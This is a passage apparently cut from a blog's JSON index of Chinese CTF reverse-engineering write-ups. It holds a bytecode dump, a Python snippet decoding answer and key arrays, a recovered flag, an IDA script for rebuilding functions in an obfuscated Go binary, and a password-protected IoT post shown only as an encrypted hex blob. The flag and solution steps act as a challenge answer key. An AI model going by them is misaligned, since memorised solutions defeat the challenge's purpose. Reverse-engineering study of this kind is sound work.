CBC_PUSH_TWO_LITERALS reg:4 reg:3 934 : CBC_PUSH_PROP_LITERAL const:72-&gt;string(length) 936 : CBC_LESS 937 : CBC_BRANCH_IF_TRUE_BACKWARD offset:20(-&gt;917) 939 : CBC_PRE_INCR_IDENT reg:1 941 : CBC_LESS_TWO_LITERALS reg:1 ident:21-&gt;string(count) 944 : CBC_BRANCH_IF_TRUE_BACKWARD offset:48(-&gt;896) 946 : CBC_PUSH_LITERAL ident:27-&gt;string(message_c) 948 : CBC_BRANCH_IF_FALSE_FORWARD offset:10(-&gt;958) 950 : CBC_PUSH_THREE_LITERALS ident:29-&gt;string(print) ident:17-&gt;string(compare_array) ident:27-&gt;string(message_c) 954 : CBC_PUSH_LITERAL ident:26-&gt;string(ans) 956 : CBC_CALL2_PUSH_RESULT 957 : CBC_CALL1_BLOCK 958 : CBC_RETURN_FUNCTION_END 123456789ans=[1605062385,-642825121,2061445208,1405610911,1713399267,1396669315,1081797168,605181189,1824766525,1196148725,763423307,1125925868]for i in ans: print(hex(i&amp;0xffffffff)[2:],end=&#x27;&#x27;) #5fab4ef1d9af445f7adf285853c7eb9f662065e3533f7b83407aea30241255056cc3ba3d474bc7f52d80ea4b431c43ecprint(&#x27;&#x27;)key=[19088743,2309737967,4275878552,1985229328]for i in key: print(hex(i&amp;0xffffffff)[2:],end=&#x27;&#x27;) #0123456789abcdeffedcba9876543210 ctf{w3_f0und_1t_112ug31vjhe121f21fas} machine参考：祥云杯复盘 machine go语言+vm栈混淆 - TLSN - 博客园 (cnblogs.com) ida恢复一下函数1 12345678910111213141516import idc import idaapidef upc(begin,end): for i in range(begin,end): idc.del_items(i) for i in range(begin,end): idc.create_insn(i) for i in range(begin,end): idaapi.add_func(i) print(&quot;Finish!!!&quot;)begin = 0x000000000047F900end = 0x00000000004c6ee0upc(begin,end) 通过给的code.bin找到相关字符串 但是函数没有被正常反编译，尝试patch 这里全nop掉 得到就是main函数","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"祥云杯","slug":"祥云杯","permalink":"http://example.com/tags/%E7%A5%A5%E4%BA%91%E6%9D%AF/"}],"keywords":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}]},{"title":"iot基础","slug":"iot基础","date":"2022-10-18T10:50:47.000Z","updated":"2022-10-24T12:59:46.398Z","comments":true,"path":"2022/10/18/iot基础/","link":"","permalink":"http://example.com/2022/10/18/iot%E5%9F%BA%E7%A1%80/","excerpt":"有东西被加密了, 请输入密码查看.","text":"47b49a4a2f06ffaeeb6d37e9691a4c66f63ff4446f79fd1f5ecd8d03847f2564b21ad1fe86c5c010bb0fde8494da3ab5ca077f9e54a5fdf83b5b66e09481ce2da4a68dd9f31314ef8d11d72c78b75b5d108c8fe4d70d0b2d4b3baa2ac39d5e1bb52d914ecc67b1c073fd866625fc540fe73936610cbd68702787e65bdebf3c8f3c9de12c0aaec6545cb4d67750a357f1db1c77e0069c927fb9b5fd3c2c95cd474a5a2394e88899484826305869e99e6ab6551953ffd94f4161babf0d5e47678b11713a97360d108a31c32762566bea69c787705cf83e85d7180518c181435e934877403a8d46426b8fd2456b08e3a4ac4f43da706830e7650827dcea0a5446b4129ad5cdcc88028b6154abd71d517dd97f06ef78e8578c99bb05e824377a328d1ee61ff0161377b2023dadd1b8574d61002f0111ec532841bb6ebc7119afb8c029d31588b5e0e6d2bda34a91ee70db346895b631b3693b6960ce36a8f90552003cdeed95a8a9f97fd9c5a5856fe0bdec1ccfe22bb90b11faab8868a6d38c5fdb1590ad85beda8bd489a95da2877dda521f299b61f1a5f24dd01833dcabdc4189ec2ae7cdd5494799a913e6ff7a60b535a84ecf443205ab0a5e6ba87ed58df1810392ebbe923a8ce29c6274918283f1564cf43c2d7b843bb9e121f754ca9d34a80cb5769a69ee6ede3bf1c8d9c7ffc29a1b4007e8fd8151325891088db480ce363003c410a7a8d484d14c705be5fb3a4a0a937caddc689417132e06061d29f540f16f573ee395e71a079db5ee2db80f99bf6ab089742a6467274693419c83936191442440a7d492d14b5fa7b036ae16aa71f2d39b373436e5b6623ed496d6d1d0bed22c94788a34b29de2e3cce6c8181ceb13186cea1f5337d42d16fa31a99d7a7abb2a22464ecd74382c3be3cc6bce80828dd7d8c1f6f7dd279a2a50bbfff35487e66e18f7081ab4034f406d943398eb99f37423f9e5e8860db286996583dd82058f2a011d865dd1d117a9ff8f9175689a03353b25e08375b26f91d0cd12dbb8a439249e21d5f66e5096d999782cb88c2d74644e529bde5ffeba05db2bcee2992604e466e62844943b1005e7ec2dc5d42119797eb51002230ed73ef3b562fc4715088fb914c47c279a4940aadae2552dc700acf69a1614f8eabf5be048994c075dda7c02f7625bcefce5b79e6dfadd8f05f3808f15d3420a4d6b78d5d8e21060b71697d24d1191f92321346df0465a09c318b505b6eec41a707c074b381bb4a58c1ce242c261fdc9af52309b9822f88346e15136e69f100adaf53706d1c5ceab6697c11e2ec22ca54d1ca1b9aab5295123bb705fed7fbee66f1265c84c8044fd9fac75d87f5e050ce826842eefa549e0bade88dbd5f3944212380bb84473710f4b5e338891c762cd2ba817430047cd8bff2f0675a2f30b48e0464f87fd16ca697889dda78d805ca81c012538c532cefe016e01c24257fab0558d2b41dc510b90329af8afd8d20fe510ffae78e470f5084b30ae04a9f48f22f0bb6f78be4565f5dd25adcb1fdd248fcd686c18ba1aa79baf8fb4de96dc2c185a14c170c670804aa45a323486ed1b5ab02429b6b88c4d44a4ef95a1a837790cf398bca10e57ea364c3c26ec42692464a9df53cd6c2c6e8f963ee43281c64d15df49f7df6f3482c245c4f5e9be88e6c82ef9d80c3f244b7e8aa83b82c57ba66e1f5b8f64b0b6c06bec21ab915c11bc62c6a5f70d2900afba7d780614715879bc5d78489887bc6dad7f2b9ecd2ab56b60e39dd4fa565d1c18196c2e8127c1a12d22ac798d0224cffdd832727f714f1e0e1977024972196a75e397123c19a80a3350891f52d3c115296475443c29c560a794d6b82e64a191f0145fbec19fdd3c4173e9f7eda5144a54c3fdc99320246d58a9da1c4f6fbe78db64a2e5eb60e056b111d57ad749d8b243eefca7c917a6bf6d5bbcc7be438ddd23976d49737762a920571daebb9860f8a73e4ed596ee1dab96f2e3b0b4cd19b1464ba328c20b45d120657358c758169379524136828dcbeea96ce80dba77a26187e081f82589f0b42ef3e0d5046694a11f3b52453baf8c44b4729159a479770443fd2b66352b9d7b310821f81ca5114cb832beb48176e1a60e0aae14b43ecfad14ba1d743e53be895957881301712701f8d58c8fb73d78cf8343e6600977597ba4f3d71661530c6dacf58601b9b28b4d9cc3e37db70cf41ab183f196737033eec0bdf757f19fba0c717936ed50cb9deb5fa8f12274aa960b6b1502fb3df7eb0bd8c38d0ecf68721862f70075cab0f4932244aae4d4d96b96e92430603f4778d4f8dc6107ef837d1c836f92cceab1e31548f1a25dd5160b0f9e856d3f9f13f98717d3b747e107f56d490a18744c3ae8bfbf9bcd4eeb485c1cf8da21b5f3780da8c512441036b75b0aecff07f229bd7aa1689b0a0e7521be158e0856297bf22f63ddab70313d5c932710cae975b77d623300e33d26692e7154ac3bbb2db445f7e33d0d1eb16d65af587c0884576a5b5ba836983860dcdecd22c403a7c4a4907ecd48a7fdf9f22f414a4ea88df5b0028d02d234c8c204f117c684cdbd084d35eb91528f5c7693f0b418b282b29c0883b304ac6fedbe0d39ae194a5091fbc05a59cae3356f7c88349e380abfc42fe02aab9d77c0455d3768f0f230458a0bb7f7849044740b2a1700f09e1229f6d5e944928872c193995787afc7c65d6cb23c22f0398172d642cdae6cfd07df50aa63e638ee99bb2a22493aa5167c0d352dec1a3d67686e733fa508c1739da68e1f6b0ee63bca97b8c68b26a2eb448e7c0f3e6b5ab43190b8bddde7888295eead73bf015323765cd957826f7e879f48dcea9c9004e1e34207406fe73df97bc57ff66b9d4eeb72033a962b717b4a0db224d4f6ad800830fc62b379f50d8eabf87e3696601a9a83b1801d26612904534d8dc3d45a90710a795366172ea0f218b5ee4ceb3eacb31586b4fd86e7e424d34e82af74d0610a9aaf22a04e5db56790b6e38eb490b49ec6b9809f9e1eb1950d33c673d7860cf17b7f3434e17a0962e72e84cdc7081ec0242a3cf95bd014a3bdeb7e7d7f3f39ab5ce094c136772b00b5974fa0a524c3b1e6f0c65261f61b7305e0085ad7c905cf235202c6475f667555e1d2aee4846b1a5d5e5b61e4f1af6e165f6fea9ca820abe6c8f2713a878f0a0307fb35d243b636ec6b457beccfb9941c95b5ee404e47a23f347014505f0f12e05fe02cff80bace3083c6bed1018bdeffa9d43e14e3eda223771eb7938e82392dac94dae0bf4679ca0d6530a8aec6cfbc0bb721a3d9f9a5fc1ea2cc8dc75fe8c14c2d1b33aa1bf25dc6b5b3a6dd398cd68f015786628aff927a8ee2909f164ac78670dde6a5d3c9eb9c8d417c4ea8924385d0c3e8dcea8fced77eaee1f2cba974ead993c37fd96acc40517c714b17d050e2e5411ca502d05a16a8fb06944f8c2a081571d4ecd733af3193e44cb75ac0046a21cb8f5af6abbb372199fd455a13537847fdeffc3cb753dddc5e4a123f08769c3a7642b0cf072d90eb5ae37426e6f722931c820aece31fff54a6e730ffa7e16470964c84d57164228fba1e62b10142ad5acb4f98c146ebe990e557ba7b8b015fae12602a2d2ba0a539337333d6c4f7cc62e6d28d14d6805c9cd6a707864f365ce09e828d5595de326747f518cc4bb89d774d1069ae972814090d6d3825448022145af87b875693ad1d7d0e4c08b556f06619e33658bc7d762761494a2bdf553f2873e7ec212186187995575d779a6e9949d7938e4d3991278d1b89fd0131b92e0693b3c20e0b00d4833cebdd018861c0db8f65d550c10b4d8e2bd3afcacadf94b72b73a21d2939a362c61ede87d6a051fa157d8ecde74e67bb97807c7683089cf31305d48a5cd4259b284cd8bc6df185524d6475b8f19398d6b4f8c731e7d44a98a7de9f09299ea49863b47ea28d499f20e8a12dbdee425661b56662c6104f7301f7ae6953f8b13917fcc2271a9f03dd723c1006802af9574a6d9c53270bc231439b5261e8002ce519def41904dc0d8cc44b338a421bb850cc829a7cce6ad43c0ef3d1d421c43d4c5cada50aa481c9874e1de82aa66e1b6bb0ed64f36cfe3c5e42a5ef250bf3546b7371ac4c7e3d3497ea0880b58a8b2ba977e2b2ad694ffc46870bdc5a5e43c5a5e75338ebee3cc4afaa90c1009fbb20c8f0697eafaebfa6ca79ecaabfce60de0513ee40dafe00decc2682cc4096e6f2607df6505dbcbae1c139901097e7f65a1d8803bad331ce6dd9d21bf560dff91c1b0a88896792a308d8faf8b32dcbc76f3d8ade0c95751d6e191fc8f1bac580a85c93aeb5fa2be18724cb9fdd23088a84c1b20cd1876de393059829e6af16fe0953efe6324d15553cfa4046cf635e67421969c344bc58bff6ac2323fccb3d10871fc40b9b0d53e25cef0afe0cc44e3b6fc33fba2ca5739748ee76bbdfce15d37b8b88d88ceef890796cacc02a0c95a8b53dff313dc91c6658b039ccd7fc1fdd1454e37b8e9e97db2bb2e3b488cb9279cb455ac1d8db56645fd8f4f240102587be3406434b6e302c5761ae1c4fbe64731bdb1c6f5559222f9cd100cb622d82c8ef625b9abcb25a3e54eacad3a20c285942a78eff172fcb0238a0147f5108c88d97ab38225013473eceb6e002847f127e2296076957c03fac2bf79cc58894a82d8b9adc5db901b644d8cc1fc6c7a568e5af8d5a2b4bcde7f2259390ec6208b6e07de33275d449f8b718ff7c16dcbcc9e2deea452105b99373dc679de852bab5ef91e3626fca5c4e78016cddebee9b32acefca7631840c49b3f101ac0aa4ba8f2a59c0ad2478f98e198e1500a1aba83c97edf32fc66f5f1c2bec7b6f1293e070d10760940fd360c989a632bc2b4541e7db8bc6f1965f883257efc935f6f03c67cc6def900e131dab367ba277492be4422a14a74afb7d46e0c6d7d2691c8889c9411188c89c46e474daa08fb0e975ac59ebb8d9123694a2b80a1319c8d47fac250958f309c5c810a8ac1089f7c78b52cc769afc2585c8753a006575e92bbce064078cf3513560ddeb2062385dab9a7b8f1b5204a511df19a092d09aa37d7e4b635132dc6ba3f76e4bdc194afafd32868932b82f893c89fafc0453c14cf23a51c7ba9a3135db6e62127d3e47f6187b9651e358fd6554c63886aa982926e7972b3f0139579e4d6c1445385081e2cffffefa5b1fc7313e37cfdb774b9b98eac83f40dd5ee58e497461c77a6ef1198f72f9e651a9269a7e796229e1878e6d9caee5260abd995851de99381f7cc8ce4ee5410a98526d57c8c7e629d46a5067b6c1239bb5809d2c87cbd77c62e5eefcbca21d35db4043f7732adc4e79238c502082fb0509ea0ec305707796d001be4ad362acb59109564b5d7b4848bb335b06d7a4b8b8ee8dfde30a0a516fba719e18b9da6d57dccfdc7830a037384f339faf79554ae4697e149cd9f3201d6b7e402d382c652027b00b8d39cc98c953986fba1ace92a50bc74c760c28ee2aed32d2b4314141ac8b4ce1da8b173e5cf9362d71704d26c4ab64cefd5c4b7a0f33cc99d4330f44238215c33fb178646092737948460013ca1a86b59af1e2a52b1cef466141b434f0948a1669079a0c6023dd11b67161708feea28a34b9e4dadc723011dd31311cdd7f6a62f0614284f70e9aa50cbe8d8e7497ad7db60da9acc2d8fa1df3de574f55fc418c382e85407991874a3e9d40c0b359eb288212d2cdd4a9aae45fbefdc66034b2134cc3922d0587be842daa7ec4e0bea6819e9adb9cfc912160e18c7218ce93439a8d6c384c46804f93805f368a5a0e47c0fb523aac6ef114d5d694ed2173621b92fb6ee39fca4abe680531a9a55a2316077be41e509aa30f7bc35e91377ce3b7782bd3029a70113a0cb3f9170ce2bf9ea24019321e6c9ee3396ee2018e256257f1a4fce6c9476b2a9e318003bdf3a762ad9b9567c5dfe1a82459c5cb82f412d46ee8eac9aea2a4beae6cd700f6df4c8d7547ce95ea4690cffae97dbaffa789d8fa3e76b8bcd69ba36389f5f2602db7bbacfd3c22b66615e3b8568c806a307a92a9948531b4f0f51503baeca14ed98a1a26bb78dac6ccea1910ed15bd521eceafd0b8e8d6cfd5f6837a9813453c02e5a898bae751eae60f81ac66bcb75530f938929ff134d1e71173735cb73d2305462caf25e211c78a8217e701cbff0243cab31f86c2acf697296e035c7754d57767cf9cc485407cec59a385b582e31326fa6d598191a0810b79cfd187b591dbaf0570dfdb7942e2215ad0ec32d8e27512fd5a5632bb6aca09a5e3a7abc897b42a9f77dbad21c55bf7b7d1d5165f72f32a449a62f81ab34e025dab023c0dc4b8cf9eb9bcf12e7cad94af2388d43d58e2283c904ce1b06320834c2662008f995fa590979483ff212167b875fd2c6e0d67b19ebffb363e4c8235491708950f5fe6263a0ef6fc196598476d05182c991f3773d049c4284b5af6dbf8fc111f598215786611c36e3b53df73486b21ffe8fc5372bda24614e0c6adf93609dcfaac128fa8cf0601bc8a303931fc9b620b989c138ca753965e1b850101249931e061a348d0e3b9d92bfb83d2cb2e0f25d13adf41d53c5af53cb97c81b9c369334743899748f06c003421d6fc7454b158f619c0279664580fa4252acb3a49e8ea3a9922e0130850d708def0ef48dea0759a7cdabc975a17a0dfe9a1ec49f9096a4f410c0561c4a235483ccb2fc1dac17fc09d17cbacb7ecbe0ef4f60c0a318338e7491a461a56c5ac2ba8ee0a2e95b3e6aa5da18d2a3d20614d9654d06b7b1af9ec71def3a2d9c067714bd1d534b108bab092ea129a54976a320a734a05df5d7e387b1cdb40af8f572f09e1fae1d21dbc00ab93942a49014078ebf174e144026614a8f3728be7d80874ac917c4425b33aba88a07d15f4364c4aee4feab0431d3f2a31a3bb5d5bbf671c62cc92855ecf4be9ea8c315e5d3c71b2fb599affeea2cc7ad5b4dabac94aa683d66c8353f8c6693e6c584a240433a0b1ec2a5f1c647faaf4b9d719d4c0aef210af91c8c9097c2d975bcd8ceddc32cea3db5c35483a154fb82c13748523f168a585b885b6a30562c4eef59a78918ba50db0eaa59dc4ec6fdc368eebcfc86a38aa1ed270f323f4b9b29baf30ecfb69b30bf795fff085b18a4c13d99750069e1deef391f8ff6e45fec685bd6d34a0fc9b42aa2967d5e5799cc4372abe255d98f979ec83a48fe3f1045f3c3d19f2f601e1c74b43056b69a5db0a7bbaa23c1e1ee4e58feb29b3e819bf30eb25d699ad3b7f1f7baed29e935884823fd6c06fcc65601f70b560d79449028e290bb2fd34c391783cfed298768ec51819b1d83623fe5414d4585f4c8de4e838e3f395aeb128f9433460eeeda4a9839e3a1d84df887d0ec771367b4f5c3be0414c57e9bb7fca7270d0af4f7dba9313297d6889292bb5f8293bdefc78fa933d76a37701664fafb1459d3cdd6fb8e9f2824bfe02e2bb1c0832ccac597ce668202d8472d99523c3485af3b47193115fa77cdeaeeabf779cafe8814b43120ef4489e6ba75147bfb711e802099435dc2659ad7a60baa564398259eb058f45a8652f0d0eaf92fd7eb9962517f22bffd8218d7bb9a31048968902f7672911867ac6bc97a0cb46b05d14cfc451c79f5c03d5f1817912ca9c46e74931fdac2bea934f19739881be0ed1a1a9b46da24eb99ec4ac7d0272672ba5d2da6fd18948bdba90b8c96b6c771d43b212bf796e300abdbd1e84a65a4d89001b0496760f3aa780ffb09ac3bc7b254b773a7cb165d570c9a554a60285ddf3648c7dad7919ebe853fe54eb2af15103caa3a11df61f4a828bdef7321c4e2bfcb87a35135c0dc6438d8d302095df2b2f4e0a27dcdaaa255d3afdc7d85a103b26d0caef3205e27d9d72efa3e0c82b728a5b768eb3f961a17d828eae75dd40f86e0fea60f03e0e7b63e7545d796b3e97e6fabd84d0b4315480a4ffa74a793ce68d544155dd209cef46ac0af7557ea0f7d8c65c18bd8efda044bbb48f9a444216287e23cf0bb08cc87d7a81bd8648d295ef312deeac60ee6823fb2c29ff755ddd944c3c0764abe7d0f302eca818649da741514db68e875338f7d6e5c1d7f8b83ee5ac1c7154edaa849df4ca5659f4c09b27cfcd40a9d5fced296effb3bc8dbad6205ab68d293bfea437c81b4b5d588be7e61f63bd634c0a2b7059963cfdba7c579c224ab85db60b2365a887b5c65e0019ce9e31445cd386144c03796d887e2cc994124e2aea3c1331f3f8015610614340112d0cc154e956d3bcee75ff2bcc85ffbc63ca651929eaa81db8a6066092735b8c955bfda1eafedf46a44ed7ab42478d3016ceddee373029189e2effbdb9de4d7f2e275c7da1d2c25308bd32537c35a748a2195bab1423fb457c372c634434b75a39259b8999fa1e6b9dc1ec6d9802989d21b5326122ceea1b2623c151a7b8074a5ec792d8bbaab0d50a297a50685447c4af8eb9aeef64d95a8f339c9482af92f041edc7eb0284b78717a885999d249efc111da0cfcb2a6c17e1cb3a6d07e3085d87bcb993c8f22ad06e0fa480f30df336cd21181d0bf021b20f6667554ce04c4ef114b4a9648c5616456bd7d64c6087c02b4c844975d1e167210f62939f7b4eb142cf0a573504bc8813cee3b3dff8e7c9f76a93d56044c45678973a3d39f25efc82e774216fac10eca69c1fa7a7364c8a4cfe92f1a64c3cc0186f2f65cb9372a93efb378e0361fb64afac002b79c8a4bf54fd121ddfbfc8c84cabcba2ff2c47e6b05f7fd3ebb664bbd2a240f449761d7a1043a857f8989037110220f405fe2af6963125ca930e552f7e17ceaa0169762777cb15448b1cb90e0e8c76b19544447499ac3c937fd680727d0c3d87408db742bc7de208748ac4e4671afd2387f3435e0ab2e213ab1db15613ef91119dd0ccb22d29512656782e841a04f4f50a0be34c5b2847d650659c71a79bb3b00c8f775c1aaa18e8e88700dd1d91311b7b3ab385aeaba57cd95ab3ae209fc9d628fb6670543254d2731599633c267cf94db788e4f3e2048980adf5ab316867b9747a517da1344cbdfa6545e394d0597a1397865566e6c09071438a3a9646227d324fd62ba2a617b7bd387011e55ed4b3aea4a689f92b45763e9068a9a817c8020e42bb4d963dd0c3c4d4849ebcb072321b59717bb2e7e4ed0c3bcebba1a252dbfb96408c08729001b8f1a6fb138189c45d018e5a0e4b15004713b8aa9118eace70a81c308b8b1f7739733d473f4dfd5eeff3bf768b09646a6e55b5896e9227f047f6c1b4d9443bf6811e5ba26d577650e1e76dd3af3721c1683a11d8ef6d544ef7772e0a7a2e31abfbf39d83b5a130e6697d44ed060f1e051c62c1596164e8eb97009b38459bd7982ad2e919e8de816a644f63e547a885c6e658d5e3d6447724f13c13f2bc3c0dfef726fa746b42789c860f4cd41cee116ea850bb3a6f0c07ca62e5aaeb151cc2b0bb8cb719a8e534be44e3aed886c18c1ae32fc1954677b38ce3372cc9051bb36efa64a8544b32864e635a0862e08f2dcf415dc2a2043e65ee628be08d544f6103ed9338beae2a6b71e65c4ceb972eb1562db5f4eadd534d989dcedf638f49e59bab2ad503261a68860b77281a0a9603804636b6543f927520272a7340d4321357f66383843ba113d231e56ffb966b92a9376a5eefd3f7dac2fe4cfab0564fd2a8f05915b2e36e8fdbf2e0778e5d9886421cb07e296bd9bfb2a3d68bb50195129a26520fa4fa232709ed497a02278b94e7f1a57f8d5257750a9e881bc2384bdfe281573d30fe699f72dd76cfc45a16e87e450e8b662690139bb9a1c052782155936d0358af3709a3ec0f0cab0f538b7196743955e42b2edcb3160e88b567348d81e5e0c25d0905843e346f6ad307e8414667a4aab2ea9be3f7a5e09da05a91aea5e1fa4b779d1601ae86e36dcb763ee86f0c534e3f6ea46ef586014531e5b4c6bfd6c7270a4342891470ac2888e9714a4392d002359b0b737e1e75c084c153921ab206aa70394acf02136e3fd3fd7cc116f8738722cdd242792bbcf6ca43509f2a3e8a5d814db4d5ba7f642f9834bd4c6937dbad1d2f32c18d80303bfcb8ab3c1f77cfa7e3a3d222dbe8de50c4a7ad0141600e2a5ac4544364a8fdf7594f20775e0ff387b749c9dc76f1f1d4674479b70d1acb7ea1c016d5e80eb11953c2e8b88f59e1335e0044247ea2f6d8b50cf090814ce5d307eab7aa4ac4e0790997db78d58aff6032b42d13e4a436737faff2d40ae27bf5ef08fb5c09cef5e8f685b761707b6af0e1898515fc4b755a3bba923b1c5706123fd7899d3662f383f4a93630e97e7422bf6fa098f275274b1f294c1239c0a844f319f951d2c285a63bde86822cd880b93e0fc983937c9f6490e17f79b06b6b5128926fa94b5fbd94cd171009d212b00ede88452453759b01d976f53d7f77afd869baaf2e1622a262fa36f813209a38ba6e6cd6c24724b8d1a819a1b694c3a1292ff479c2851b3ecb29575a533fdb60aa8d2796f19ab65d6779310b671aa877b03c9fc86c2642acae267f8689103b0ca7756d9d42fbd82754dd08285ae88457d5d3defb79f0a81adfd017fbd254351bc200eee008db8190a8ab8276091862de8a23ce1df2cf0fb3d25d19591c6402e7d6c3fdf5c17deea813094fd324ba81e79c192af769256e3182e8c81a7337216c99cd9faba4a17d1ea6b60f787822ef6e18ee340a061e329259d8f32f642c8f61041943df5b68c34a88da3e98e26a43f4d217ed8e122d961da6fd092fb36740a949aebe203a1f0e851959fd0c2ebe03038d03ea190b75e5f9141aa048adace026b669ff9a56e235ec75d09c87fbe8900e5f99e8e8226989992f31918e43f53d08a7cd4ad7ad017b81bff6e81c4e8f36184316c8b705c99bbacbcc18bca51781cfd6108e532bee04838ea0063dd85c2f2de8902a5512cb0337d60d7673254a67c9d993c3a7d91ba383e08ddcd5da34112c1db873b44abea0615f32f10cb601f25d1032be92f8e6e174dca1e2fa28286410f6f44defb216f6fbb18fea23655dd971917012057a54b51744ca3db6c0afc18e30a82866f0bf4d0241646eab98a29b2dffda41df9aacff9d7e24da1466255de4da7b2aa53d1429a0ebde2747e81a362fe6e5cb6b9d88935d8e72ea6ec36068082d1a721ad9306102be399859176894b2a0e3433e34529c49e514af9189e264bb593bc1a68266bb06f6e4b4f948568160ffec0e6bfec0a61b176016e6bbf14bcaf12b7339b3cbbffdb3f0e42b6056c453e423b8172f557d25afa67587ee9b3dcd2a2dd0fd061771fd4cda888b6a2a2d2b0cb05cae3bde2a8efc8ee2c534d9025018518f0d492b2c1c4874f367c290aba65d397df14978ff01294e1262c155be24f4affadb101106dff6a5383ba981c0cc60af56738bb3295a11e0777dd69011d24aeabffb2f0fbed97bfb44bd0390584258576be7217ff87b5c750848a956bdcc655d4cdcce4a7d6a7d72d247c414ecd5cb7a98cc6de21816c50e0e07cd92e80a4a5f9e3ef1caafc1574e4d9bbd7a975b17a815953b3aaa29a4b0518d3b61b7ab4652f435df7d7e89e7f1521f61590c69f85f281a33c9f4aaad020ee4512f5fdf40e09ee2267f6e12c1f8c829c8dfec97968b7e14acdddba987c131540824cdb0a9d5aacfd4938fa32a0a009329a30a93cea90dd4bb42e58dff88ff8c162915e3c4f0febc0b18bced5e2e591e54eb5306566885f00a768d8ac48ee105f4c3534965c1a4bc63a7e91e97d7704356851f0be375b25305c223c8b1079ca5aad7bab286dbad73a0e15372fa30ce6c1e17d762ebbb3f61c9eeb3f6495a2e769f777487520aaa04ab4888d1b45d6fc857bc7253a55ba911d19440fe22c8f024ba91b34ae70498d0ec9b456c5fb938ff0fd876fd4d3c5f4b8a7a7f581299bf7fb00bf3cdecc5d48d4c7de028c5915392573abbcc9e03ac3d6626c7d128dc8244c9c69bf3068c87db51aa4a989fb8696f2c483a7595e703146afed686a1e76e2e5c1a7bc65549f039f288e7cc4dcde8f50ee52aa0ae75958baec7f5a712259165f43b9aac39e18a7211b819143c46efef0332ab74cbd8f3e628d3cfc8c32ed6c8992026d57a4475444104d1006de4bcf2d6246e592f44db0a459e21ca40c735418861dd37c818d78242eb613065ffd60a13d75b6605872fcd84815eeae50649de268fd033a0c4ae4587fe56744f5534219097b74005bab9afa425e39bd959d96684ac2c21c8c80351b3214f16415b8160fafdb9716d388707b61cabbe857d84980ce92132f6fd9e32d5b8e84cbe29641c183ee493e882381fa926e444a982584d1b6221ce254516e3b3ee4183edb7991dd44cdfebc20b48c3a3417bed1a0bb19d56587abaa464e04d4300edb3c132fe7fcd14c2f1fff53addcb3a877f44878a38f7557bf218cdd3f82acce2aa0e5f10f8ad680e26feb49ba3d208e3b5ce37420ee8b866397e75d5943c2d7ab66ed3b5b8dbc8e190ceb8d636899fdd29c5344613b46e0cd279e30ad0ca1fd0b0695a881c9720918053225528113175ed05ccba255466efa84d001bbeafe754b9cfc137696eab17e279c5c34500fc54143baf8f2be57483a9870034002b1a19ee46d294819896864c7ac2e51c29fd6c24165149592ee866480c131f20ebbf8857d8fef875cb6b58fdf1e575f2dcb744a4a408ffec8977ae7642948531ed9c216504e0a3fea588456432186314586d3fc9a76c73be5347b4120a65d47ab444c3573f6661e6c16fb407a64b393fb9e435a894c4f3cf754063c9f8317d3b6691cf6f8f3c537881d134f91a0de218be46aae36bae72981bbc9a0191e5a8413f41fd358195903e50a2f0e4059a95913cfd0ba138ba69d8bb69b313ca2ebab23e83e1cc09afb70d226c1e4e0ed700d5c2d43c42f2b259f2cb2f6cbcd64351412809f2fa13bb7eff2b9d17ef8ef75b0cbdc261b23be73eaec8b146331a313ebca1c199f11c0924bdbae55aebdf45370c24fc7f59dae99f18d796ca7d8691ed7e880097954f713de08b5c45f0500f4caf6bff961ee6ef0db8075aab7b71fa4826ae058f617778b4944ee791fcc9560df5d43d2cf22c19953b5bf0dc562240a7538bf7830fc50ab52a1099712da6174a41acd2c168ad044ab088086d881504bf7e4ba7c78211e6b9d1b8a8f7b41d57b1bee83dad6022ecaa6096f773b6d3c4e6ce6bdccdbecdc640831d0a2dc921b532aa1d7d0a5c727b724e8a767a118f938987a01dafdb7cd91d7edeca6eda5ccee74214ce2fa2b2caac032573811d6c00fa967b92fffa00d772117f8fc09ce4f349d4c6f376f91adf4abec130e5f46c372be581bc9efcc2ae957dfe3d6229051f6b4313d885a148bbd5c4803daac952b925f2844c9b6d2ba554ea267cd53fc19fb369fd6292b0d5e41e9e9b803b7937f2dd37d95e48d29321f6367b50e8d24a499515bb9f487fb912601837dbe31bd61282b05a59347241f83102484af59302f12439a08cb5fa4dd69d15aea57ecf3fe666be556ddf2f7fbb2b5151dccf07f33e26e1d73646857e84021ff50c44a265643833674fc613ae4baf88f61a3bb799e4562fa9b61f9712ec2df3741f5c2120715728b155dca484d7c47fefb423a3d6320d052f211d60e0a71f12ffb47ddb08c9cd7254d8a3ded611b51c4086fd402e3f719f1fa1a233a0208c7d56c3494741f478bc90ac6253c870f803ce41199a1dba028c79984d5b831d96e4ce7f96bc13aa52a7bb313afc2def8c95295e2cb902e160f1a2868d8a5d52514152a1c44fea1a8bd872b3279d9b4512aef1fbc9bd166f36fb171ce12bda6385e580828baa1382020706e8ba03ee5346972854f6294f4f7947f7ff353a5b4df3f5e40c53d389ce74ea72666bdf4aeb552d94adf5e1711d47d4530c66d05fe8317058833cfbd4d857771be6d49ffdf90bf2b93d15fc320b305492d5731bb14402c8a33dca9fb8e82a0ad28c48b77ba8948b46dd9fc4fbc07fd9bd8d1fc52519db37aa5da62177bb14d2b6e91088ea6949c7c9a53af65aacc90b08cbd33d8b2bde9ca05aa87551ef8ec724664eba409e08e6703ad0f874d7fb711034de06c50e81cf7a80c4f227243281f5c4c53400290fb184f7d8f338d48f34aaa8a500f112a8ccd62024e1bee3d32c905ed4e59cb3151338b7e404d4dcaf5737de48c85efc3938fd5fabf689fbceae8354df81af3dbbab135a12c91c55d50361944e79be247a6da6d10015e27a5aefb48e5fc4d3a24e1d97b37cfc1139605cf227b185b6b46a3422fe3a6b70f4288998da41d05aa653d4ca0da3c68f9b32dfd0dfc8a43df802feeaa0c40ced77fe5f09ca07ae582f1f39f28f454100aff676e2d1097468f370ab9939831bcce878133482b8eabeae80b658faeaa989c55839d09f41c32830728f016584fc1ecb971483737ef569ea53b0e3774078e3d095de9a8f86df04b783e83290c1a35aec58a132a5b254657954b6c886792383dbdf41d289c3205159910e2194c19288d32bf4b540572293734521ead0dcc41a87dbaf867bbe1d1cf378b9300eabc06d758b4b4f288a0808fc30555800d1a9b27bd80f7eff21035fdd528788370883360a4cd4d6f4a3b3fb81491d75fcbbfe9201424c9431ec163fd7c9b519f018ebf95cdfb7244faab184f076b47fb6e46f8d4d01fe6a46acf1cbfe6bdb98bbdf6066bbf99e3d7fcc08e134586430cc3661fff64eeadde548e4ac14a4d23a491260edc54140a5ef2862f8fc6a36a1cf521f84e49dbf2e29d7957179cbdc9fca0c18d709cc031